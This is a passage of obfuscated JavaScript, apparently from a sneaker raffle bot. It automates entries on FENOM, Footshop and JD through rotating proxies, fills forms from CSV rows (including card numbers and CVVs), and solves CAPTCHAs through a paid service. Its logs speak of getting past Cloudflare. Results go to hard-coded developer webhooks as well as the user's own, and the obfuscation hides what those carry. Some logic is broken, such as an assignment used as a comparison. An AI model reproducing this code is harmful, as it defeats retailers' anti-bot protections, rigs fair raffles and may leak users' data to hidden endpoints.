                                    _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x285c3a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4f1a4a(_0x540a14, _0x285c3a['succesDEVMSG']);
                            } catch (_0x330005) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x330005);
                            }
                        } catch (_0x16b546) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Task\x20' + (_0x16516d + 0x1) + '\x20:\x20' + _0x16b546)), _0xf09ac6 = '' + _0x16b546;
                            var _0x57d464 = await _0x597409(_0x2d134a[_0x16516d], _0x5bfe40, 'acc', !![], _0xf09ac6);
                            _0x285c3a['errorDEV'] = { 'embeds': [_0x57d464] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x285c3a['errorDEV']), await _0x4f1a4a(_0x166efb, _0x285c3a['errorDEV']), _0x54e887 = 'yes';
                        } finally {
                            _0x292a49['close']();
                            if (_0x54e887 == 'yes' && _0x94639e != 0x5 && _0xf09ac6 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Task\x20' + (_0x16516d + 0x1) + '\x20:\x20Retrying')), _0x16516d = _0x16516d - 0x1, _0x94639e = _0x94639e + 0x1;
                                continue;
                            }
                            _0x54e887 == 'yes' && _0x94639e >= 0x5 && (_0x176a1f(_0x2d134a[_0x16516d], _0x5bfe40), _0x54e887 = 'no', _0x94639e = 0x0), console['log'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3226f5(_0x2ee949, _0x5b4fb6, _0x107a30) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x221cea = 0x0; _0x221cea < _0x5b4fb6['length']; _0x221cea++) {
                        if (_0xf8717f != 'yes')
                            var _0xf8717f = '', _0x2e5960 = 0x0;
                        var _0x8ce8fe;
                        await _0x200aab(_0x5b4fb6, _0x221cea), _0x2167ba(_0x2ee949['name'] + '\x20Task\x20' + (_0x221cea + 0x1) + '\x20/\x20' + _0x5b4fb6['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21);
                        const _0x79b01 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x436d1c = Math['round'](Math['random']() * (_0x107a30['length'] - 0x1)), _0x4fee6c = _0x107a30[_0x436d1c]['split'](':'), _0x2eb7f8;
                        try {
                            _0x2eb7f8 = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4fee6c[0x0] + ':' + _0x4fee6c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2eb7f8 = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4fee6c[0x0] + ':' + _0x4fee6c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xa37291 = await _0x2eb7f8['newPage'](), _0x659ddd = await _0xa37291['target']()['createCDPSession'](), { windowId: _0x507582 } = await _0x659ddd['send']('Browser.getWindowForTarget');
                            await _0xa37291['authenticate']({
                                'username': '' + _0x4fee6c[0x2],
                                'password': '' + _0x4fee6c[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa37291['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xbec2fc(0xbb8), await _0x659ddd['send']('Browser.setWindowBounds', {
                                'windowId': _0x507582,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xbec2fc(0x1f40);
                            try {
                                await _0xa37291['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xbec2fc(0x1388), console['log'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Logging\x20in'), await _0xa37291['type']('input[name=\x22email\x22]', '' + _0x5b4fb6[_0x221cea]['Email']), await _0xbec2fc(0x1f4), await _0xa37291['type']('input[name=\x22password\x22]', '' + _0x5b4fb6[_0x221cea]['Password']), await _0xbec2fc(0x258), await _0xa37291['$eval']('#login-form', _0x13b828 => _0x13b828['submit']()), await _0xa37291['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xbec2fc(0x1f4), await _0xa37291['goto']('' + _0x5b4fb6[_0x221cea]['Url']), await _0xa37291['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x5b4fb6[_0x221cea]['Size']);
                            if (_0x5b4fb6[_0x221cea]['Size'] != 'RANDOM') {
                                var _0x57d44b = '\x20' + _0x5b4fb6[_0x221cea]['Size'] + '\x20';
                                const _0x38c1ee = await _0xa37291['$x']('//span[contains(text(),\x20' + _0x57d44b + ')]');
                                await _0x38c1ee[0x0]['click']();
                            } else {
                                const _0x126290 = await _0xa37291['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x589790 = Math['round'](Math['random']() * (_0x126290['length'] - 0x1));
                                await _0x126290[_0x589790]['click']();
                            }
                            await _0xbec2fc(0x258), await _0xa37291['click']('#cookieChoiceDismiss'), await _0xbec2fc(0x3e8), await _0xa37291['type']('#instagram-account', '' + _0x5b4fb6[_0x221cea]['Follower']), await _0xbec2fc(0x28a), await _0xa37291['click']('#book-btn'), await _0xbec2fc(0xbb8), await _0xa37291['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0xbec2fc(0x1f4), console['log'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20' + _0xe1d9e['cyan']('Solving\x20Captcha')), await _0xa37291['solveRecaptchas'](), console['log'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xbec2fc(0x7d0), await _0xa37291['$eval']('#book-btn-for-sure', _0x4622aa => _0x4622aa['click']()), await _0xbec2fc(0x12c), await _0xa37291['click']('#book-btn-for-sure'), await _0xbec2fc(0xdac);
                            const _0x384a25 = await _0xa37291['$eval']('.reservation-popup\x20>\x20.title', _0x549b27 => {
                                return _0x549b27['innerHTML'];
                            });
                            if (_0x384a25) {
                                _0xf8717f = 'no', _0x498d8e(_0x5b4fb6[_0x221cea], _0x2ee949), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xf4a64b = await _0x597409(_0x5b4fb6[_0x221cea], _0x2ee949, 'dev', ![]), _0x3fbdff = await _0x597409(_0x5b4fb6[_0x221cea], _0x2ee949, 'pub', ![]);
                                const _0x25c09c = {
                                    'succesDEVMSG': { 'embeds': [_0xf4a64b] },
                                    'succesPUBMSG': { 'embeds': [_0x3fbdff] }
                                };
                                try {
                                    _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x25c09c['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x25c09c['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x53e58f, _0x25c09c['succesPUBMSG']);
                                } catch (_0x2387e3) {
                                    console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2387e3));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x273f1e) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20' + _0x273f1e)), _0x8ce8fe = '' + _0x273f1e;
                            var _0x48eb00 = await _0x597409(_0x5b4fb6[_0x221cea], _0x2ee949, 'dev', !![], _0x8ce8fe), _0xf4a64b = await _0x597409(_0x5b4fb6[_0x221cea], _0x2ee949, 'dev', ![]), _0x3fbdff = await _0x597409(_0x5b4fb6[_0x221cea], _0x2ee949, 'pub', ![]);
                            const _0x24151e = {
                                'succesDEVMSG': { 'embeds': [_0xf4a64b] },
                                'succesPUBMSG': { 'embeds': [_0x3fbdff] }
                            };
                            _0x24151e['errorDEV'] = { 'embeds': [_0x48eb00] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x24151e['errorDEV']), await _0x4f1a4a(_0x166efb, _0x24151e['errorDEV']), _0x273f1e != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xf8717f = 'yes');
                        } finally {
                            _0x2eb7f8['close']();
                            if (_0xf8717f == 'yes' && _0x2e5960 != 0x5 && _0x8ce8fe != 'Size\x20Not\x20Found') {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Task\x20' + (_0x221cea + 0x1) + '\x20:\x20Retrying')), _0x221cea = _0x221cea - 0x1, _0x2e5960 = _0x2e5960 + 0x1;
                                continue;
                            }
                            _0xf8717f == 'yes' && _0x2e5960 >= 0x5 && (_0x176a1f(_0x5b4fb6[_0x221cea], _0x2ee949), _0xf8717f = 'no', _0x2e5960 = 0x0), console['log'](_0x27df86() + '\x20[' + _0x2ee949['name'] + ']\x20Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x8da7c2, _0x513db5, _0xab06b8) {
                _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1c5a09['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3e6292 = 0x0; _0x3e6292 < _0x513db5['length']; _0x3e6292++) {
                    var _0x442861;
                    if (_0x1a892f != 'yes')
                        var _0x1a892f = '', _0x86e543 = 0x0;
                    var _0x45ae42 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x50a8aa
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x513db5[_0x3e6292]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x513db5[_0x3e6292]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x1c5a09['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x18cd5d
                            }
                        ]
                    }], _0x3b3a27 = await _0x597409(_0x513db5[_0x3e6292], _0x8da7c2, 'dev', ![]), _0xe922b6 = await _0x597409(_0x513db5[_0x3e6292], _0x8da7c2, 'pub', ![]);
                    const _0x56f7db = {
                        'succesDEVMSG': { 'embeds': [_0x3b3a27] },
                        'succesPUBMSG': { 'embeds': [_0xe922b6] }
                    }, _0x454be7 = { 'embeds': _0x45ae42 };
                    await _0x200aab(_0x513db5, _0x3e6292);
                    if (_0x513db5[_0x3e6292]['Email'] == '' || _0x513db5[_0x3e6292]['FirstName'] == '' || _0x513db5[_0x3e6292]['LastName'] == '' || _0x513db5[_0x3e6292]['Country'] == '' || _0x513db5[_0x3e6292]['Size'] == '' || _0x513db5[_0x3e6292]['Address1'] == '' || _0x513db5[_0x3e6292]['Zip'] == '') {
                        console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x513db5[_0x3e6292]['Email'] == '' || _0x513db5[_0x3e6292]['FirstName'] == '' || _0x513db5[_0x3e6292]['LastName'] == '' || _0x513db5[_0x3e6292]['Country'] == '' || _0x513db5[_0x3e6292]['Size'] == '' || _0x513db5[_0x3e6292]['Address1'] == '' || _0x513db5[_0x3e6292]['Zip'] == '' || _0x513db5[_0x3e6292]['Phone'] == '') {
                        console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x3633b9 = '' + _0x513db5[_0x3e6292]['Url'];
                    if (_0x1c5a09['useRandomProxy'] = ![])
                        var _0x14748c = _0xab06b8[_0x3e6292]['split'](':');
                    else
                        var _0x142da6 = Math['round'](Math['random']() * (_0xab06b8['length'] - 0x1)), _0x14748c = _0xab06b8[_0x142da6]['split'](':');
                    const _0x3bdfe0 = await _0x59f17d['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x14748c[0x0] + ':' + _0x14748c[0x1]]
                    });
                    try {
                        const _0x2b93bc = await _0x3bdfe0['newPage']();
                        await _0x2b93bc['authenticate']({
                            'username': '' + _0x14748c[0x2],
                            'password': '' + _0x14748c[0x3]
                        }), console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2b93bc['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2b93bc['setRequestInterception'](!![]), _0x2b93bc['on']('request', _0x5127cc => {
                            _0x5127cc['resourceType']() === 'image' || _0x5127cc['resourceType']() === 'font' || _0x5127cc['resourceType']() === 'media' ? _0x5127cc['abort']() : _0x5127cc['continue']();
                        }), await _0x2b93bc['goto'](_0x3633b9), await _0xbec2fc(0xbb8), await _0x2b93bc['waitForSelector']('.control__JhutY'), await _0x2b93bc['click']('.control__JhutY'), await _0xbec2fc(0x1f4);
                        if (_0x513db5[_0x3e6292]['Size'] != 'RANDOM')
                            try {
                                const _0x5dd48 = await _0x2b93bc['$x']('//div[contains(text(),\x20\x27' + _0x513db5[_0x3e6292]['Size'] + '\x27)]');
                                await _0x5dd48[0x0]['click']();
                            } catch {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x439804 = await _0x2b93bc['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x4bc904 = Math['round'](Math['random']() * (_0x439804['length'] - 0x1));
                            await _0x439804[_0x4bc904]['click']();
                        }
                        await _0xbec2fc(0x4b0);
                        const _0xf13d14 = await _0x2b93bc['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0xf13d14[0x0]['click'](), await _0x2b93bc['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x2b93bc['type']('input[name=\x22email\x22]', '' + _0x513db5[_0x3e6292]['Email']), await _0xbec2fc(0x640), await _0x2b93bc['type']('input[name=\x22phone\x22]', '' + _0x513db5[_0x3e6292]['Phone']), await _0xbec2fc(0x4b0), await _0x2b93bc['click']('button.btn.continue-button__1RtsS'), await _0xbec2fc(0x4b0);
                        try {
                            await _0x2b93bc['type']('input[name=\x22firstName\x22]', '' + _0x513db5[_0x3e6292]['FirstName']), await _0xbec2fc(0x258);
                        } catch {
                            const _0x49ba15 = await _0x2b93bc['$$eval']('.invalid-feedback\x20>\x20div', _0x476f0d => {
                                return _0x476f0d['map'](_0x1afa3d => _0x1afa3d['innerText']);
                            });
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20' + _0x49ba15));
                            continue;
                        }
                        await _0x2b93bc['type']('input[name=\x22lastName\x22]', '' + _0x513db5[_0x3e6292]['LastName']), await _0xbec2fc(0xc8), await _0x2b93bc['type']('input[name=\x22instagramUsername\x22]', '' + _0x513db5[_0x3e6292]['Follower']), await _0xbec2fc(0x4b0), await _0x2b93bc['click']('button.btn.continue-button__1RtsS'), await _0xbec2fc(0x3e8), console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x2b93bc['select']('select[name=\x22country\x22]', '' + _0x513db5[_0x3e6292]['Country']), await _0xbec2fc(0x2bc), await _0x2b93bc['type']('input[name=\x22streetName\x22]', '' + _0x513db5[_0x3e6292]['Address1']), await _0xbec2fc(0x258), await _0x2b93bc['type']('input[name=\x22houseNumber\x22]', _0x513db5[_0x3e6292]['HouseNumber'] + '\x20' + _0x513db5[_0x3e6292]['Address2']), await _0xbec2fc(0xc8), await _0x2b93bc['type']('input[name=\x22postalCode\x22]', '' + _0x513db5[_0x3e6292]['Zip']), await _0xbec2fc(0x1f4), await _0x2b93bc['type']('input[name=\x22city\x22]', '' + _0x513db5[_0x3e6292]['City']), await _0xbec2fc(0x4b0), await _0x2b93bc['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xbec2fc(0x4b0), await _0x2b93bc['click']('button.btn.continue-button__1RtsS'), await _0xbec2fc(0x4b0), console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x2b93bc['solveRecaptchas'](), console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xbec2fc(0xbb8), await _0x2b93bc['click']('button.btn.continue-button__1RtsS'), await _0xbec2fc(0x1388), console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2b93bc['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2b93bc['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xbec2fc(0x4b0), await _0x2b93bc['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x513db5[_0x3e6292]['CardNumber']), await _0xbec2fc(0x320), await _0x2b93bc['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2b93bc['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x513db5[_0x3e6292]['ExpiryDate']), await _0xbec2fc(0x4b0), await _0x2b93bc['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2b93bc['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x513db5[_0x3e6292]['CVV']), await _0xbec2fc(0x226), await _0x2b93bc['type']('input[name=\x22holderName\x22]', '' + _0x513db5[_0x3e6292]['NameOnCard']), await _0xbec2fc(0x226), await _0x2b93bc['click']('button.adyen-checkout__button'), console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x2b93bc['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xbec2fc(0xbb8);
                        } catch (_0x218a75) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x203DS\x20Failed')), _0x442861 = '3DS\x20Error\x20' + _0x218a75;
                            var _0x7b43d5 = await _0x597409(_0x513db5[_0x3e6292], _0x8da7c2, 'dev', !![], _0x442861);
                            _0x56f7db['errorDEV'] = { 'embeds': [_0x7b43d5] };
                            _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x56f7db['errorDEV']);
                            await _0x4f1a4a(_0x166efb, _0x56f7db['errorDEV']);
                            continue;
                        }
                        _0x498d8e(_0x513db5[_0x3e6292], _0x8da7c2), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                            try {
                                await _0x4f1a4a(_0x1c5a09['webhook'], _0x56f7db['succesDEVMSG']);
                            } catch {
                            }
                        await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x56f7db['succesDEVMSG']), await _0xbec2fc(0xc8);
                        try {
                            await _0x4f1a4a(_0x53e58f, _0x56f7db['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x50655) {
                        console['log'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20' + _0x50655), _0x442861 = '' + _0x50655;
                        var _0x7b43d5 = await _0x597409(_0x513db5[_0x3e6292], _0x8da7c2, 'dev', !![], _0x442861);
                        _0x56f7db['errorDEV'] = { 'embeds': [_0x7b43d5] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x56f7db['errorDEV']), await _0x4f1a4a(_0x166efb, _0x56f7db['errorDEV']), _0x1a892f = 'yes';
                    } finally {
                        _0x3bdfe0['close']();
                        if (_0x1a892f == 'yes' && _0x86e543 != 0x5) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x8da7c2['name'] + ']\x20Task\x20' + (_0x3e6292 + 0x1) + '\x20:\x20Retrying')), _0x3e6292 = _0x3e6292 - 0x1, _0x86e543 = _0x86e543 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x1c5a09['footshopDelay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x3f0465, _0xd70e26, _0x20dfda) {
                var _0x162b3d = ![], _0x12fdb6 = ![];
                if (_0x1c5a09['captchaKey'] == '' || _0x1c5a09['captchaKey'] == undefined)
                    return console['log'](_0xe1d9e['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1c5a09['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x34fcda = 0x0; _0x34fcda < _0xd70e26['length']; _0x34fcda++) {
                    if (_0x4fe352 != 'yes')
                        var _0x4fe352 = '', _0x5aafab = 0x0;
                    var _0x298967, _0x396d74 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0xd70e26[_0x34fcda]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xd70e26[_0x34fcda]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x50a8aa
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x1c5a09['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x18cd5d
                            }
                        ]
                    }];
                    const _0x5e768f = { 'embeds': _0x396d74 };
                    _0x2167ba(_0x3f0465['name'] + '\x20Task\x20' + (_0x34fcda + 0x1) + '\x20/\x20' + _0xd70e26['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0xd70e26, _0x34fcda);
                    var _0xb79810 = await _0x597409(_0xd70e26[_0x34fcda], _0x3f0465, 'dev', ![]), _0x530ed1 = await _0x597409(_0xd70e26[_0x34fcda], _0x3f0465, 'pub', ![]);
                    const _0x3524e4 = {
                        'succesDEVMSG': { 'embeds': [_0xb79810] },
                        'succesPUBMSG': { 'embeds': [_0x530ed1] }
                    };
                    if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                        try {
                            await _0x4f1a4a(_0x1c5a09['webhook'], _0x3524e4['succesDEVMSG']);
                        } catch {
                        }
                    await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x3524e4['succesDEVMSG']), await _0xbec2fc(0xc8);
                    try {
                        await _0x4f1a4a(_0x53e58f, _0x3524e4['succesPUBMSG']);
                    } catch {
                    }
                    if (_0xd70e26[_0x34fcda]['Email'] == '' || _0xd70e26[_0x34fcda]['Url'] == '' || _0xd70e26[_0x34fcda]['FirstName'] == '' || _0xd70e26[_0x34fcda]['LastName'] == '') {
                        console['log'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1c5a09['useRandomProxy'] = ![])
                        var _0x936e6a = _0x20dfda[_0x34fcda]['split'](':');
                    else
                        var _0x17706f = Math['round'](Math['random']() * (_0x20dfda['length'] - 0x1)), _0x936e6a = _0x20dfda[_0x17706f]['split'](':');
                    const _0x57af53 = await _0x59f17d['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x936e6a[0x0] + ':' + _0x936e6a[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x502271 = await _0x57af53['newPage']();
                        await _0x502271['authenticate']({
                            'username': '' + _0x936e6a[0x2],
                            'password': '' + _0x936e6a[0x3]
                        }), console['log'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20Getting\x20Session'), await _0x502271['setRequestInterception'](!![]), _0x502271['on']('request', _0x252cc7 => {
                            _0x252cc7['resourceType']() === 'image' || _0x252cc7['resourceType']() === 'font' || _0x252cc7['resourceType']() === 'media' ? _0x252cc7['abort']() : _0x252cc7['continue']();
                        }), await _0x502271['goto']('' + _0xd70e26[_0x34fcda]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x502271['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20Filling\x20Information'), await _0x502271['type']('#comp_firstname', '' + _0xd70e26[_0x34fcda]['FirstName']), await _0x502271['waitForSelector']('#comp_lastname'), await _0x502271['type']('#comp_lastname', '' + _0xd70e26[_0x34fcda]['LastName']), await _0x502271['waitForSelector']('#comp_email'), await _0x502271['type']('#comp_email', '' + _0xd70e26[_0x34fcda]['Email']), await _0x502271['waitForSelector']('#comp_paypalemail'), await _0x502271['type']('#comp_paypalemail', '' + _0xd70e26[_0x34fcda]['Email']), await _0x502271['waitForSelector']('#comp_mobile_end'), await _0x502271['type']('#comp_mobile_end', '' + _0xd70e26[_0x34fcda]['Phone']), await _0x502271['waitForSelector']('#comp_dob'), await _0x502271['type']('#comp_dob', '08/09/1992'), console['log'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0xd70e26[_0x34fcda]['Size'] == 'RANDOM') {
                            const _0x54c987 = await _0x502271['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x53a4d5 => {
                                return _0x53a4d5['map'](_0x251b97 => _0x251b97['value']);
                            });
                            var _0x5129d4 = Math['round'](Math['random']() * (_0x54c987['length'] - 0x2));
